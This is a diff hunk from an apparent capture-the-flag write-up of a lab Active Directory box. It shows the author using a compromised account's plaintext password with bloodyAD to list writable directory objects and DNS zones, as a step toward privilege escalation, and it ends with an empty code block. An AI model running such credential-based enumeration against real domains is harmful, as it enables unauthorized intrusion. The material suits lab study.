@@ -540,5 +540,30 @@ SMB         10.129.230.179  445    DC-ANALYSIS      [-] analysis.htb\badam:DMrB8
 
 I have compromised `wsmith`
 
+# Writable objects as `wsmith`
 
+```python
+❯❯❯ bloodyAD --host dc-analysis.analysis.htb -d analysis.htb -u wsmith -p 'DMrB8YUcC5%2' get writable                                                    
+
+distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=analysis,DC=htb
+permission: WRITE
+
+distinguishedName: CN=soc_analyst,CN=Users,DC=analysis,DC=htb
+permission: WRITE
+
+distinguishedName: CN=william smith,CN=Users,DC=analysis,DC=htb
+permission: WRITE
+
+distinguishedName: DC=analysis.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=analysis,DC=htb
+permission: CREATE_CHILD
+
+distinguishedName: DC=_msdcs.analysis.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=analysis,DC=htb
+permission: CREATE_CHILD
+```
+
+I have some permissions over `soc_analyst`
+
+```python
+
+```
 
